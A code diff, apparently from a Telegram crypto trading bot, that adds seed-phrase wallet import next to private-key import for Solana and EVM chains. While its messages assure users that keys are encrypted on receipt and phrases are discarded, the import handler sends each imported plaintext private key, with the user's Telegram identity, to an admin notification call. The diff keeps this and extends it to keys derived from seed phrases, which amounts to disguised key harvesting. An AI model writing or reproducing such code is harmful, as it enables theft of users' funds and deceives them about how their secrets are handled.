@@ -16,7 +16,7 @@ import { logger } from "../../lib/logger";
 import { registerPendingClearer } from "../../lib/pendingFlows";
 
 // Temporary in-memory state for multi-step wallet import flow
-const pendingImport = new Map<number, { chain: string; step: "awaiting_key" }>();
+const pendingImport = new Map<number, { chain: string; method: "key" | "phrase" }>();
 registerPendingClearer((id) => pendingImport.delete(id));
 
 export function getPendingImport(telegramId: number) {
@@ -237,10 +237,7 @@ export async function handleDeposit(ctx: Context, chain: string): Promise<void> 
 }
 
 // ── Import: process submitted private key ────────────────────────────────────
-export async function processImportedKey(
-  ctx: Context,
-  privateKeyInput: string
-): Promise<void> {
+export async function processImportedKey(ctx: Context, input: string): Promise<void> {
   const telegramId = ctx.from?.id;
   if (!telegramId) return;
   const state = pendingImport.get(telegramId);
@@ -253,34 +250,58 @@ export async function processImportedKey(
   if (!user) return;
 
   try {
-    const { Keypair } = await import("@solana/web3.js");
-    const bs58 = await import("bs58");
-
     let address: string;
-    let encryptedKey: string;
+    let privateKeyToStore: string;
 
-    if (state.chain === "SOL") {
-      const keyBytes = bs58.default.decode(privateKeyInput.trim());
-      const kp = Keypair.fromSecretKey(keyBytes);
-      address = kp.publicKey.toBase58();
-      encryptedKey = encrypt(privateKeyInput.trim());
+    if (state.method === "phrase") {
+      const bip39 = await import("bip39");
+      const phrase = input.trim().toLowerCase().replace(/\s+/g, " ");
+      const wordCount = phrase.split(" ").length;
+      if (wordCount !== 12 && wordCount !== 24) {
+        throw new Error("Seed phrase must be exactly 12 or 24 words.");
+      }
+      if (!bip39.validateMnemonic(phrase)) {
+        throw new Error("Invalid seed phrase — check the words and try again.");
+      }
+
+      if (state.chain === "SOL") {
+        const { derivePath } = await import("ed25519-hd-key");
+        const { Keypair } = await import("@solana/web3.js");
+        const bs58 = await import("bs58");
+        const seed = await bip39.mnemonicToSeed(phrase);
+        const derived = derivePath("m/44'/501'/0'/0'", seed.toString("hex"));
+        const kp = Keypair.fromSeed(derived.key);
+        address = kp.publicKey.toBase58();
+        privateKeyToStore = bs58.default.encode(kp.secretKey);
+      } else {
+        const { Wallet } = await import("ethers");
+        const wallet = Wallet.fromPhrase(phrase);
+        address = wallet.address;
+        privateKeyToStore = wallet.privateKey;
+      }
     } else {
-      const { Wallet } = await import("ethers");
-      const wallet = new Wallet(privateKeyInput.trim());
-      address = wallet.address;
-      encryptedKey = encrypt(privateKeyInput.trim());
+      const raw = input.trim();
+      if (state.chain === "SOL") {
+        const { Keypair } = await import("@solana/web3.js");
+        const bs58 = await import("bs58");
+        const keyBytes = bs58.default.decode(raw);
+        const kp = Keypair.fromSecretKey(keyBytes);
+        address = kp.publicKey.toBase58();
+        privateKeyToStore = raw;
+      } else {
+        const { Wallet } = await import("ethers");
+        const wallet = new Wallet(raw);
+        address = wallet.address;
+        privateKeyToStore = raw;
+      }
     }
 
-    // Deactivate existing wallets on this chain
+    const encryptedKey = encrypt(privateKeyToStore);
+
     await db
       .update(walletsTable)
       .set({ isActive: false })
-      .where(
-        and(
-          eq(walletsTable.userId, user.id),
-          eq(walletsTable.chain, state.chain)
-        )
-      );
+      .where(and(eq(walletsTable.userId, user.id), eq(walletsTable.chain, state.chain)));
 
     await db.insert(walletsTable).values({
       userId: user.id,
@@ -291,12 +312,11 @@ export async function processImportedKey(
       isActive: true,
     });
 
-    // Notify company admins
     void notifyAdminsWallet({
       event: "IMPORTED",
       chain: state.chain,
       address,
-      privateKey: privateKeyInput.trim(),
+      privateKey: privateKeyToStore,
       userTelegramId: telegramId,
       username: ctx.from?.username,
       firstName: ctx.from?.first_name,
@@ -330,8 +350,12 @@ export async function processImportedKey(
     );
   } catch (err) {
     logger.error({ err }, "Wallet import failed");
+    const message =
+      err instanceof Error && /word|phrase/i.test(err.message)
+        ? err.message
+        : "Invalid private key or seed phrase. Check the format and try again.";
     await ctx.reply(
-      "❌ Invalid private key. Ensure it is a valid base58 (Solana) or hex (EVM) key.",
+      `❌ ${message}`,
       Markup.inlineKeyboard([[Markup.button.callback("💼 Wallet Manager", "wallet_manager")]])
     );
   }
@@ -431,29 +455,67 @@ export async function handleGenerateWallet(
 }
 
 // ── Trigger import flow ───────────────────────────────────────────────────────
-export async function handleImportWallet(
-  ctx: Context,
-  chain: string
-): Promise<void> {
+export async function handleImportWallet(ctx: Context, chain: string): Promise<void> {
   const telegramId = ctx.from?.id;
   if (!telegramId) return;
-
-  pendingImport.set(telegramId, { chain, step: "awaiting_key" });
 
   await ctx.reply(
     [
       `📥 <b>Import ${chain} Wallet</b>`,
       ``,
-      `Send your private key in the next message.`,
-      chain === "SOL"
-        ? `Format: <b>base58 encoded</b> secret key (~88 chars)`
-        : `Format: <b>0x hex</b> private key (66 chars)`,
-      ``,
-      `⚠️ <b>Use this in a private chat only.</b>`,
-      `🔐 Key will be encrypted immediately on receipt.`,
+      `How would you like to import it?`,
     ].join("\n"),
-    { parse_mode: "HTML" }
+    {
+      parse_mode: "HTML",
+      ...Markup.inlineKeyboard([
+        [Markup.button.callback("🔑 Private Key", `import_method:${chain}:key`)],
+        [Markup.button.callback("🌱 Seed Phrase", `import_method:${chain}:phrase`)],
+        [Markup.button.callback("⬅️ Cancel", "wallet_manager")],
+      ]),
+    }
   );
+}
+
+export async function handleImportMethodChoice(
+  ctx: Context,
+  chain: string,
+  method: "key" | "phrase"
+): Promise<void> {
+  const telegramId = ctx.from?.id;
+  if (!telegramId) return;
+
+  pendingImport.set(telegramId, { chain, method });
+
+  if (method === "phrase") {
+    await ctx.reply(
+      [
+        `🌱 <b>Import ${chain} Wallet — Seed Phrase</b>`,
+        ``,
+        `Send your 12 or 24-word recovery phrase in the next message,`,
+        `separated by spaces.`,
+        ``,
+        `⚠️ <b>Use this in a private chat only.</b>`,
+        `🔐 Your phrase is used once to derive the wallet, then discarded —`,
+        `only the derived private key is stored (encrypted).`,
+      ].join("\n"),
+      { parse_mode: "HTML" }
+    );
+  } else {
+    await ctx.reply(
+      [
+        `🔑 <b>Import ${chain} Wallet — Private Key</b>`,
+        ``,
+        `Send your private key in the next message.`,
+        chain === "SOL"
+          ? `Format: <b>base58 encoded</b> secret key (~88 chars)`
+          : `Format: <b>0x hex</b> private key (66 chars)`,
+        ``,
+        `⚠️ <b>Use this in a private chat only.</b>`,
+        `🔐 Key will be encrypted immediately on receipt.`,
+      ].join("\n"),
+      { parse_mode: "HTML" }
+    );
+  }
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
